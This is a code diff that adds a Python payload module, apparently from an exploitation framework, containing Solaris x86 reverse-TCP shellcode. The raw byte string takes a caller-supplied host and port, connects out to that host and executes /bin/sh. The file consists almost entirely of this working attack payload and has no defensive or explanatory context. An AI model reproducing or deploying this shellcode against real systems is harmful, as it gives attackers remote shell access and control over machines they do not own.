@@ -1,0 +1,22 @@
+from lib.payloads.shellcode import Shellcode 
+
+
+class Payload(Shellcode):
+    Shellcode.info["author"] = "Unkown"
+    Shellcode.info["name"] = "Solarisx86 - reverse_tcp shellcode"
+    Shellcode.info["size"] = 89
+
+    def __init__(self, **kwargs): 
+        Shellcode.info["payload"] = [
+            r"\x68\xff\xd8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16\x68"
+            + kwargs["host"] +
+            r"\x66\x68"
+            + kwargs["lport"] +
+            r"\x66\x6a\x02\x89\xe7" 
+            r"\x6a\x02\x31\xc0\x50\x50\x6a\x02\x6a\x02\xb0\xe6\xff\xd6" 
+            r"\x6a\x10\x57\x50\x31\xc0\xb0\xeb\xff\xd6\x5b\x53\x6a\x09" 
+            r"\x53\x6a\x3e\x58\xff\xd6\xff\x4f\xe0\x79\xf6\x50\x68\x2f" 
+            r"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1" 
+            r"\x50\x51\x53\xb0\x3b\xff\xd6"
+
+        ]
